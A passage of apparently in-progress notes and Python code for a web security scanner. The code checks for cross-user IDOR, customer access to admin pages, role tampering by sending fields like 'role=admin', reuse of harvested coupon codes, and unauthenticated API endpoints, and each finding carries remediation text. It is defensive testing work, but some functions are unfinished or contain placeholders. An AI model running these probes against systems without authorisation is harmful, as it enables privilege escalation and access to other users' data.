    # Enumerate candidate resource URLs from A's pages
    resources = _harvest_resource_urls(a, ctx)
    if not resources:
        return []
    
    # Verify A can access them (baseline)
    out = []
    for rtype, rid, url in resources[:20]:
        a_resp = a.fetch(url, follow=True)
        if a_resp is None or a_resp.status >= 400:
            continue
        b_resp = b.fetch(url, follow=True)
        if b_resp is None:
            continue
        if b_resp.status < 400 and similar(a_resp.text, b_resp.text) > 0.9:
            # A and B see the same content → IDOR
            sev = "critical" if rtype in ("payment", "invoice") else "high"
            out.append(Finding(
                "idor", sev, f"IDOR: {rtype} accessible cross-user",
                url, evidence=f"user A and user B both see identical {rtype} content "
                              f"({len(a_resp.body)}B)",
                remediation="Scope every query by the authenticated owner; enforce "
                            "ownership checks server-side.",
                confidence="high", phase=4))
    return out
The _harvest_resource_urls function:

python
def _harvest_resource_urls(client, ctx):
    """Extract URLs containing resource IDs from authenticated pages."""
    out = []
    urls_to_check = [ctx.base_url] + ctx.discovered[:50]
    for url in urls_to_check:
        r = client.fetch(url, follow=True)
        if r is None:
            continue
        links, forms, _ = parse_page(r.text, r.url)
        for link in links:
            if _has_resource_id(link):
                rtype = _classify_resource(link)
                rid = _extract_id(link)
                if rtype and rid:
                    out.append((rtype, rid, link))
    return list(dict.fromkeys(out))

def check_idor_resources(ctx):
    """Enumerate resource URLs on authed pages and test cross-identity."""
    if not ctx.args.secondary_cookie:
        return []
    a = get_authed_client(ctx)
    if not a:
        return []
    b = ctx.http.clone(cookie=ctx.args.secondary_cookie)
    
    # Harvest
    resources = _harvest_resource_urls(a, ctx)
    if not resources:
        return []
    
    # Test each
    for rtype, rid, url in resources[:30]:
        a_r = a.fetch(url, follow=True)
        if a_r is None or a_r.status >= 400:
            continue
        b_r = b.fetch(url, follow=True)
        if b_r is None:
            continue
        if b_r.status < 400 and similar(a_r.text, b_r.text) > 0.9:
            sev = "critical" if rtype in ("payment", "invoice", "booking") else "high"

For check_vertical_escalation:

python
def check_vertical_escalation(ctx):
    """B1-B4: customer hits admin API/UI."""
    customer = get_authed_client(ctx)
    if not customer:
        return []
    admin = None
    if ctx.args.admin_cookie:
        admin = ctx.http.clone(cookie=ctx.args.admin_cookie)
        # Verify admin cookie is actually admin
        verify = admin.fetch(ctx.base_url, follow=True)
    
    out = []
    for path in ADMIN_PATHS_P2:
        url = ctx.root + path
        customer_r = customer.fetch(url, follow=True)
        if customer_r is None or customer_r.status >= 400:
            continue
        if re.search(r"(?i)(login|sign in|unauthorized|forbidden)", customer_r.text[:2000]):
            continue
        if not ADMIN_MARKERS.search(customer_r.text):
            continue
        sev = "critical"
        ev = f"customer HTTP {customer_r.status} with admin content"
        if admin:
            admin_r = admin.fetch(url, follow=True)
            if admin_r and admin_r.status < 400:
                ev += f"; admin also sees HTTP {admin_r.status}"
        out.append(Finding("authz", sev, f"Customer accesses admin surface: {path}",
                          url, evidence=ev,
                          remediation="Enforce role checks server-side on every "
                                      "admin route and API handler.",
                          phase=4))
    return out
For B6 role tampering:

python
def check_role_tampering(ctx):
    """B6: modify role/is_admin in requests."""
    customer = get_authed_client(ctx)
    if not customer:
        return []
    out = []
    role_fields = ["role", "is_admin", "is_staff", "admin", "user_type", "type"]
    role_values = ["admin", "administrator", "superuser", "true", "1"]
    
    # Try on common endpoints
    endpoints = [ctx.root + p for p in ("/api/me", "/api/user", "/api/profile",
                                        "/api/account", "/api/settings")]
    endpoints += ctx.discovered[:20]
    
    for url in endpoints:
        for field in role_fields[:3]:
            for val in role_values[:3]:
                # Try query, JSON, form
                for mode, data, headers in [
                    ("query", None, None),
                    ("json", {field: val}, {"Content-Type": "application/json"}),
                ]:
                    if mode == "query":
                        sep = "&" if "?" in url else "?"
                        r = customer.fetch(url + sep + f"{field}={val}", follow=True)
                    else:
                        r = customer.fetch(url, "POST", json.dumps(data),
                                          headers=headers, follow=True)
                    if r is None:
                        continue
                    # Success = server reflected it back and didn't reject
                    if r.status < 400 and f'"{field}":' in r.text:
                        m = re.search(rf'"{field}"\s*:\s*"?({val})"?', r.text)
                        if m:
                            return [Finding(
                                "role-tamper", "critical",
                                f"Server accepts client-supplied {field}",
                                url, payload=f"{field}={val}",
                                evidence=f"server reflected {field}={val}",
                                remediation="Derive role from the authenticated session "
                                            "server-side; ignore client-supplied role fields.",
                                phase=4)]
    return out

def check_ui_only_bypass(ctx):

        if r is None:
            continue
        # Find hidden form fields
        _, forms, _ = parse_page(r.text, r.url)
        for f in forms:
            hidden = {k: v for k, v in f["inputs"].items()
                     if any(a.get("type") == "hidden" for a in [])}  # placeholder

For the resource classification in check_idor, I'll add a helper:

python
def _id_resource_type(param_name, url):
    n = param_name.lower()
    u = url.lower()
    if re.search(r"(booking|reservation)", n + " " + u): return "booking"
    if re.search(r"(invoice|receipt)", n + " " + u): return "invoice"
    if re.search(r"(order)", n + " " + u): return "order"
    if re.search(r"(payment|transaction)", n + " " + u): return "payment"
    if re.search(r"(coupon|promo|voucher|discount)", n + " " + u): return "coupon"
    if re.search(r"(file|attachment|document|image|photo)", n + " " + u): return "file"
    if re.search(r"(review|comment|rating)", n + " " + u): return "review"
    if re.search(r"(user|account|profile|member)", n + " " + u): return "user"
    return None
Then in check_idor, use this to set severity.

python
    rtype = _id_resource_type(point.target, point.action)
    sev_high = "critical" if rtype in ("payment", "invoice", "booking") else "high"

Actually one important thing: get_authed_client(ctx) requires --test-email and --test-password. But many deployments use just --cookie. The --cookie path is already the default in ctx.http. So get_authed_client needs to also accept pre-supplied cookies. Let me check v2:

python
def get_authed_client(ctx):
    if ctx.authed_client is not None:
        return ctx.authed_client
    if not (ctx.args.test_email and ctx.args.test_password):
        return None
    c = ctx.http.clone(cookie="")
    ok, _ = auto_login_into(c, ctx, ctx.args.test_email, ctx.args.test_password)
    ...
So if the user has --cookie, get_authed_client returns None. That's a gap for check_authz_customer — it only works with test creds, not with --cookie.

Let me fix this:

python
def get_authed_client(ctx):
    if ctx.authed_client is not None:
        return ctx.authed_client
    # If a cookie is pre-supplied, use that as the authenticated client
    if ctx.args.cookie:
        ctx.authed_client = ctx.http.clone(cookie=ctx.args.cookie)
        return ctx.authed_client
    if not (ctx.args.test_email and ctx.args.test_password):
        return None
    ...

For A6 coupon authz specifically:

def check_coupon_authz(ctx):
    """A6: cross-user coupon application."""
    # Find coupon application endpoint
    coupon_endpoints = []
    for url in ctx.discovered + ctx.endpoints:
        if re.search(r"(?i)(coupon|promo|voucher|discount|redeem)", url):
            coupon_endpoints.append(url)
    if not coupon_endpoints:
        return []
    
    customer = get_authed_client(ctx)
    if not customer:
        return []
    secondary = None
    if ctx.args.secondary_cookie:
        secondary = ctx.http.clone(cookie=ctx.args.secondary_cookie)
    if not secondary:
        return []
    
    # Extract a coupon code owned by customer2 from their pages
    # Test if customer1 can apply it
    ...
This is complex. Let me make it simpler: if we see a coupon code on customer2's pages, try to apply it as customer1.

python
def _extract_coupon_codes(ctx, client):
    codes = set()
    for url in [ctx.base_url] + ctx.discovered[:50]:
        r = client.fetch(url, follow=True)
        if r is None:
            continue
        for m in re.finditer(r"(?i)(?:coupon|promo|voucher|code)['\"]?\s*[:=]\s*['\"]([A-Z0-9]{4,})", r.text):
            codes.add(m.group(1))
    return list(codes)

For check_missing_auth (E1), I need to differentiate "no auth needed" from "auth missing":

python
def check_missing_auth(ctx):
    anon = ctx.http.clone(cookie="")
    out = []
    targets = []
    for url in ctx.discovered + ctx.endpoints:
        sp = urllib.parse.urlsplit(url)
        if not sp.path.startswith(("/api/", "/rest/", "/v1/", "/v2/")):
            continue
        if re.search(r"(?i)(login|register|auth|signup|forgot|reset|public|health)", sp.path):
            continue
        targets.append(url)
    
    for url in targets[:30]:
        r = anon.fetch(url, follow=True)
        if r is None or r.status != 200:
            continue
        # Check for auth-required indicators in response
        if re.search(r"(?i)(\"email\"|email_address|\"user_id\"|account_id|"
                    r"\"token\"|password_hash|session)", r.text):
            out.append(Finding(
                "missing-auth", "high",
                f"API endpoint responds without authentication",
                url,
                evidence=f"HTTP 200 to unauthenticated request, response body "
                         f"contains user/account fields ({clip(r.text[:160], 160)})",
                remediation="Require authentication and enforce authorization on "
                            "every non-public endpoint.",
                confidence="medium", phase=4))
    return out

Fix 1 — get_authed_client must honor --cookie
The current version only authenticates when --test-email/--test-password are provided, which silently disables every Phase 4 check when the operator supplies a pre-captured cookie (the common case). Replace:

python
def get_authed_client(ctx) -> Optional[HttpClient]:
    if ctx.authed_client is not None:
        return ctx.authed_client
    if ctx.args.cookie:
        ctx.authed_client = ctx.http.clone(cookie=ctx.args.cookie)
        return ctx.authed_client
    if not (ctx.args.test_email and ctx.args.test_password):
        return None
    c = ctx.http.clone(cookie="")
    ok, _ = auto_login_into(c, ctx, ctx.args.test_email, ctx.args.test_password)
    if not ok:
        return None
    ctx.authed_client = c
    return c
